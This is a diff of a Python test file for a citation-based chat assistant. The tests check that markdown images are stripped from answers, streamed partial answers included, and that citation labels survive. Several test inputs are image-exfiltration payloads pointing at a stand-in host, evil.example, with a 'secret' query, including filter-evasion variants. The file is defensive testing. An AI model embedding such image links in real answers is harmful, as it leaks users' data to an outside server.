@@ -265,7 +265,8 @@ def test_manifest_by_id_is_empty_when_the_manifest_cannot_be_read(monkeypatch):
         ("Eat oats ![chart](https://evil.example/?q=secret) [S1].", "Eat oats chart [S1]."),
         ("![x](https://evil.example/a_(b)) done", "x done"),
         ("By reference ![x][ref] done", "By reference x done"),
-        ("Shortcut ![x] done", "Shortcut x done"),
+        ("Shortcut ![x] done", r"Shortcut !\[x] done"),
+        ("That is a lot of protein![S1].", r"That is a lot of protein!\[S1]."),
         ("A link [S1](https://doi.org/x) stays.", "A link [S1](https://doi.org/x) stays."),
         ("No image! [S1]", "No image! [S1]"),
         # Nested brackets in the alt text, which the pattern misses: the "![" is escaped.
@@ -283,6 +284,29 @@ def test_manifest_by_id_is_empty_when_the_manifest_cannot_be_read(monkeypatch):
 def test_remove_images_keeps_only_the_alt_text(answer, shown):
     """Markdown images become their alt text, so the browser never loads an image URL."""
     assert chat.remove_images(answer) == shown
+
+
+@pytest.mark.parametrize(
+    ("answer", "numbers"),
+    [("That is a lot of protein![S1].", [1]), ("Yes![S1, S2] agree.", [1, 2])],
+)
+def test_an_exclamation_mark_before_a_label_keeps_the_citation(answer, numbers):
+    """A "!" right before [S1] is punctuation, not an image: the label still counts."""
+    assert chat.cited_labels(chat.remove_images(answer), 6) == numbers
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "Eat oats ![chart](https://evil.example/?q=secret) daily [S1].",
+        "![a[b]c](https://evil.example/x?q=1) done",
+        "![x[y]][r]\n\n[r]: https://evil.example/",
+    ],
+)
+def test_no_streamed_prefix_ever_holds_an_image(payload):
+    """Every partial answer the stream can show, cut at any character, has no image syntax."""
+    for end in range(len(payload) + 1):
+        assert "![" not in chat.remove_images(payload[:end])
 
 
 def test_an_answer_with_an_image_is_shown_without_it(index):
@@ -491,6 +515,15 @@ def test_an_empty_prompt_file_is_refused(test_prompt):
     test_prompt.write_text("  \n", encoding="utf-8")
     with pytest.raises(ValueError, match="empty"):
         chat.load_system_prompt()
+
+
+def test_the_answer_prompt_matches_the_code(monkeypatch):
+    """The owner's prompt names the delimiters, label form, tier labels and floor the code uses."""
+    monkeypatch.undo()
+    text = chat.load_system_prompt(config.PROJECT_ROOT / "src" / "prompts" / "answer_system.md")
+    expected = ["<sources>", "<user_input>", "[S1]", f"{config.CALORIE_FLOOR_KCAL:,} kcal"]
+    expected += list(config.EVIDENCE_TIER_LABELS.values())
+    assert [phrase for phrase in expected if phrase not in text] == []
 
 
 def test_the_answer_prompt_is_the_owners(monkeypatch):
